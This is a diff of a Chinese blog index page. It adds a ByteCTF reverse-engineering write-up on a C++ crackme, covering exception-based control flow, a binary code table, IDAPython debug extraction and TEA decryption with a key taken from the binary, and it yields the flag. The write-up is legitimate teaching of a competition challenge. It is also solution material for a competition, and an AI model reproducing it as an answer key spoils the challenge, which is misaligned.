@@ -158,6 +158,153 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/06/moderncpp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yang">
+      <meta itemprop="description" content="it is funny">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/06/moderncpp/" class="post-title-link" itemprop="url">moderncpp</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-06 22:45:27" itemprop="dateCreated datePublished" datetime="2021-11-06T22:45:27+08:00">2021-11-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-07 01:34:10" itemprop="dateModified" datetime="2021-11-07T01:34:10+08:00">2021-11-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/bytectf/" itemprop="url" rel="index"><span itemprop="name">bytectf</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/bytectf/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p><img src="/2021/11/06/moderncpp/entrance.png"></p>
+<p>最终判断逻辑非常简单，与v10做比较，相同就提示congrats!（真的只是逐个byte比较），不过v10长得比较奇怪</p>
+<p><img src="/2021/11/06/moderncpp/v10.png"></p>
+<p>胡乱输入数据，到达最后判断函数的时候输入的数据不会改变，显然这个题目不会是让你直接输入v10（因为输入是flag）</p>
+<p>查看keyfunc函数</p>
+<p><img src="/2021/11/06/moderncpp/keyfunc.png"></p>
+<p>在keyfunc中，如果发现输入的字符串长度为41且开头为”bytectf{“且结尾为”}”，则进行一个错误(exception)的抛(cxa_throw)</p>
+<p>抛出错误后会跳转到entrance处的catch部分(符号被去掉了)(跳转过程暂时省略)</p>
+<p><img src="/2021/11/06/moderncpp/catch.png"></p>
+<blockquote>
+<p>catch下面的汇编代码在伪代码界面并不会显示</p>
+</blockquote>
+<p>按照提示构造payload后程序会输出”H4ckingT0Th3Gate”</p>
+<p><img src="/2021/11/06/moderncpp/gate.png"></p>
+<p>在keyfunc下面的虚表函数调用处进行一个断点的打，然后用ida进行一个调试的跟，进入函数process1(自己起的名称)(如果没有走catch的路线，则会进入另外一个函数)</p>
+<p>函数的开头部分将输入的字符串逐个转化为01组成的字符串，并将其串在一起</p>
+<p><img src="/2021/11/06/moderncpp/process1_0.png"></p>
+<blockquote>
+<p>我们输入的字符串第一字符是’b’，生成的字符串存在了v14里</p>
+</blockquote>
+<p><img src="/2021/11/06/moderncpp/v14.png"></p>
+<blockquote>
+<p>每次循环v14都会将字符串append在v13上</p>
+</blockquote>
+<p><img src="/2021/11/06/moderncpp/v13.png"></p>
+<p>函数的后半部分将生成的01字符串当成二进制数，每8位将其转换为16进制数据，并存放在一起</p>
+<p><img src="/2021/11/06/moderncpp/process1_1.png"></p>
+<p>处理后的数据保存在v13里，由v13传递给v9，再由v9传递给v4，再当作参数传递给某虚表函数调用</p>
+<p><img src="/2021/11/06/moderncpp/data.png"></p>
+<p>跟进虚表函数调用，发现是tea加密函数</p>
+<p><img src="/2021/11/06/moderncpp/tea.png"></p>
+<p>tea加密后的数据保存在v14里，由v14传递到v8，再由v8传递到input_1，与v10进行比较</p>
+<p><img src="/2021/11/06/moderncpp/teadata.png"></p>
+<p>如果与v10一致则检测通过</p>
+<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h3 id="提取码表"><a href="#提取码表" class="headerlink" title="提取码表"></a>提取码表</h3><p>首先要解决生成的01字符串与输入字符的对应问题，经过一番乱找，在keyfunc中的某个函数中发现了一个奇怪的数组的初始化</p>
+<p><img src="/2021/11/06/moderncpp/codetableinit.png"></p>
+<p>此数组在执行本函数的时候会将原本的数据逐个与0xAAu进行异或，得到一个字符串</p>
+<p><img src="/2021/11/06/moderncpp/cb.png"></p>
+<p>长得就很像一个码表，接下来只要找到这些字母与生成的01字符串的对应关系即可</p>
+<p>首先利用这些字符构造payload:”bytectf{adghijklmnopqrsuvwxz0123456789!@}”和”bytectf{adghijklmnopqrsuvw#%^&amp;*()_+-=[];}”这样就能生成所有字符对应的01字符串</p>
+<p>在ida里动态调试跟进第一个虚表函数调用，在汇编界面中，在<code>call 生成01字符串</code>的下一行打下断点，运行到此位置会发现rax里面存着相应的01字符串以及其长度(rax+8)</p>
+<p><img src="/2021/11/06/moderncpp/ex01.png"></p>
+<p>打下断点之后用IDApython提取信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_dbg <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">input</span>=<span class="string">&quot;bytectf&#123;adghijklmnopqrsuvw#%^&amp;*()_+-=[];&#125;&quot;</span></span><br><span class="line">continue_process()</span><br><span class="line"><span class="built_in">dir</span>=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>):</span><br><span class="line">    tmp=<span class="string">&quot;&quot;</span></span><br><span class="line">    wait_for_next_event(WFNE_SUSP ,-<span class="number">1</span>)</span><br><span class="line">    rax=get_reg_value(<span class="string">&quot;rax&quot;</span>)</span><br><span class="line">    rax_value=read_dbg_qword(rax)</span><br><span class="line">    <span class="built_in">len</span>=read_dbg_byte(rax+<span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        tmp+=<span class="built_in">chr</span>(read_dbg_byte(rax_value+j))</span><br><span class="line">    <span class="built_in">dir</span>[tmp]=<span class="built_in">input</span>[i]</span><br><span class="line">    continue_process()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>)</span><br></pre></td></tr></table></figure>
+
+<p>把两个payload都跑一遍就能得到所有对应关系了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span>=&#123;<span class="string">&#x27;00001&#x27;</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;10011&#x27;</span>: <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;11000&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;0011010&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;01110&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;010010&#x27;</span>: <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;10001&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;100101&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;11011&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;111011&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;01000&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;10110&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;00110111&#x27;</span>: <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;1111010&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;110010&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;00011&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;10000&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;10100011101&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;0110011&#x27;</span>: <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;011000&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;111110&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;01011&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;11110110&#x27;</span>: <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;000001&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;111000&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;00101&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;101000110&#x27;</span>: <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;1110010&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;100100&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;111111&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;01101&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;11010&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;11110111&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;001100&#x27;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;111010&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;00111&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;10101&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;00110110&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;1110011&#x27;</span>: <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;1010001111&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;101001&#x27;</span>: <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;00010&#x27;</span>: <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;01111&#x27;</span>: <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;10100011100&#x27;</span>: <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;0110010&#x27;</span>: <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;010011&#x27;</span>: <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;111100&#x27;</span>: <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;01010&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;10111&#x27;</span>: <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;10100010&#x27;</span>: <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;000000&#x27;</span>: <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;110011&#x27;</span>: <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;00100&#x27;</span>: <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;1010000&#x27;</span>: <span class="string">&#x27;;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="逆向数据"><a href="#逆向数据" class="headerlink" title="逆向数据"></a>逆向数据</h3><p>理论上来说只需要对v10进行一个tea的解密，再进行一个码表的查就能得出flag</p>
+<h4 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h4><p>只要找到key就行了，v17、v16、v15、v14分别对应key[0]、key[1]、key[2]、key[3]</p>
+<p><img src="/2021/11/06/moderncpp/key.png"></p>
+<p>v17=”etyb”，v16=”ftc-“，v15=”clew”，v14=”<del>emo”。所以key=”tybftc-clew</del>emo”</p>
+<p>从ida里提取出来v10的数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[<span class="number">40</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x9F</span>, <span class="number">0x66</span>, <span class="number">0xD3</span>, <span class="number">0xC5</span>, <span class="number">0x1A</span>, <span class="number">0x17</span>, <span class="number">0x17</span>, <span class="number">0xB9</span>, <span class="number">0x19</span>, <span class="number">0x7B</span>, </span><br><span class="line">  <span class="number">0xB3</span>, <span class="number">0xB4</span>, <span class="number">0x5F</span>, <span class="number">0x0C</span>, <span class="number">0xE8</span>, <span class="number">0x0A</span>, <span class="number">0x7F</span>, <span class="number">0x30</span>, <span class="number">0x80</span>, <span class="number">0x8D</span>, </span><br><span class="line">  <span class="number">0x80</span>, <span class="number">0x28</span>, <span class="number">0x52</span>, <span class="number">0x21</span>, <span class="number">0x89</span>, <span class="number">0x05</span>, <span class="number">0xD8</span>, <span class="number">0x34</span>, <span class="number">0xD1</span>, <span class="number">0x83</span>, </span><br><span class="line">  <span class="number">0x6C</span>, <span class="number">0xDE</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xB7</span>, <span class="number">0x59</span>, <span class="number">0x35</span>, <span class="number">0x5D</span>, <span class="number">0xE6</span>, <span class="number">0xC6</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>一次解密8byte的数据，一共要解密5次</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* key)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">  sum = delta *<span class="number">32</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    r -= ((l &lt;&lt; <span class="number">4</span>) + key[<span class="number">2</span>]) ^ (l + sum) ^ ((l &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]);</span><br><span class="line">    l -= ((r &lt;&lt; <span class="number">4</span>) + key[<span class="number">0</span>]) ^ (r + sum) ^ ((r &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]);</span><br><span class="line">    sum -= delta;</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l;</span><br><span class="line">  v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x9F</span>, <span class="number">0x66</span>, <span class="number">0xD3</span>, <span class="number">0xC5</span>, <span class="number">0x1A</span>, <span class="number">0x17</span>, <span class="number">0x17</span>, <span class="number">0xB9</span>, <span class="number">0x19</span>, <span class="number">0x7B</span>, </span><br><span class="line">  <span class="number">0xB3</span>, <span class="number">0xB4</span>, <span class="number">0x5F</span>, <span class="number">0x0C</span>, <span class="number">0xE8</span>, <span class="number">0x0A</span>, <span class="number">0x7F</span>, <span class="number">0x30</span>, <span class="number">0x80</span>, <span class="number">0x8D</span>, </span><br><span class="line">  <span class="number">0x80</span>, <span class="number">0x28</span>, <span class="number">0x52</span>, <span class="number">0x21</span>, <span class="number">0x89</span>, <span class="number">0x05</span>, <span class="number">0xD8</span>, <span class="number">0x34</span>, <span class="number">0xD1</span>, <span class="number">0x83</span>, </span><br><span class="line">  <span class="number">0x6C</span>, <span class="number">0xDE</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xB7</span>, <span class="number">0x59</span>, <span class="number">0x35</span>, <span class="number">0x5D</span>, <span class="number">0xE6</span>, <span class="number">0xC6</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//test</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> k[]=<span class="string">&quot;etybftc-clew~emo&quot;</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> *v=(<span class="keyword">uint32_t</span>*)ida_chars;</span><br><span class="line">    <span class="keyword">uint32_t</span> *key=(<span class="keyword">uint32_t</span>*)k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;<span class="number">8</span>*j&lt;<span class="number">0x28</span>;++j)</span><br><span class="line">      decrypt(v+<span class="number">2</span>*j,key);</span><br><span class="line">    <span class="comment">// for(int i=0;i&lt;40;i++)&#123;</span></span><br><span class="line">    <span class="comment">//   printf(&quot;0x%x,&quot;,v[i]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res=(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)v;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>,res[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得出解密后的数据，用python的列表存储，然后将每个byte转化为8位的二进制数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>=[<span class="number">0xc</span>,<span class="number">0xf0</span>,<span class="number">0x69</span>,<span class="number">0xd8</span>,<span class="number">0x4a</span>,<span class="number">0x32</span>,<span class="number">0xfb</span>,<span class="number">0x62</span>,<span class="number">0x8e</span>,<span class="number">0xa4</span>,<span class="number">0xcc</span>,<span class="number">0xc</span>,<span class="number">0xc0</span>,<span class="number">0x22</span>,<span class="number">0x63</span>,<span class="number">0xe5</span>,<span class="number">0xb6</span>,<span class="number">0xfd</span>,<span class="number">0x7</span>,<span class="number">0x5e</span>,<span class="number">0xe6</span>,<span class="number">0xfe</span>,<span class="number">0xc6</span>,<span class="number">0x8d</span>,<span class="number">0xfd</span>,<span class="number">0x8d</span>,<span class="number">0x51</span>,<span class="number">0xad</span>,<span class="number">0xe4</span>,<span class="number">0x68</span>,<span class="number">0xfa</span>,<span class="number">0x14</span>,<span class="number">0x78</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得出二进制字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&quot;000011001111000001101001110110000100101000110010111110110110001010001110101001001100110000001100110000000010001001100011111001011011011011111101000001110101111011100110111111101100011010001101111111011000110101010001101011011110010001101000111110100001010001111000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>将其与前面得到的字典(输入与01字符串的对应关系)进行一个暴力匹配</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span>=&#123;<span class="string">&#x27;00001&#x27;</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;10011&#x27;</span>: <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;11000&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;0011010&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;01110&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;010010&#x27;</span>: <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;10001&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;100101&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;11011&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;111011&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;01000&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;10110&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;00110111&#x27;</span>: <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;1111010&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;110010&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;00011&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;10000&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;10100011101&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;0110011&#x27;</span>: <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;011000&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;111110&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;01011&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;11110110&#x27;</span>: <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;000001&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;111000&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;00101&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;101000110&#x27;</span>: <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;1110010&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;100100&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;111111&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;01101&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;11010&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;11110111&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;001100&#x27;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;111010&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;00111&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;10101&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;00110110&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;1110011&#x27;</span>: <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;1010001111&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;101001&#x27;</span>: <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;00010&#x27;</span>: <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;01111&#x27;</span>: <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;10100011100&#x27;</span>: <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;0110010&#x27;</span>: <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;010011&#x27;</span>: <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;111100&#x27;</span>: <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;01010&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;10111&#x27;</span>: <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;10100010&#x27;</span>: <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;000000&#x27;</span>: <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;110011&#x27;</span>: <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;00100&#x27;</span>: <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;1010000&#x27;</span>: <span class="string">&#x27;;&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot;000011001111000001101001110110000100101000110010111110110110001010001110101001001100110000001100110000000010001001100011111001011011011011111101000001110101111011100110111111101100011010001101111111011000110101010001101011011110010001101000111110100001010001111000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line">start=<span class="number">0</span></span><br><span class="line">end=<span class="number">5</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    tmp=<span class="built_in">str</span>[start:end]</span><br><span class="line">    <span class="comment"># print(tmp)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dir</span>.keys():</span><br><span class="line">        <span class="keyword">if</span>(i==tmp):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">dir</span>[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            start=end</span><br><span class="line">            end=start+<span class="number">4</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    end=end+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>跑一下得出flag</p>
+<p><img src="/2021/11/06/moderncpp/flag.png"></p>
+<p><img src="/2021/11/06/moderncpp/success.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/17/LargebinAttack/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1112,84 +1259,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/15/buu-ciscn-2019-n-8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yang">
-      <meta itemprop="description" content="it is funny">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Y">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/15/buu-ciscn-2019-n-8/" class="post-title-link" itemprop="url">buu-ciscn_2019_n_8</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-06-15 22:22:29 / 修改时间：22:30:48" itemprop="dateCreated datePublished" datetime="2021-06-15T22:22:29+08:00">2021-06-15</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
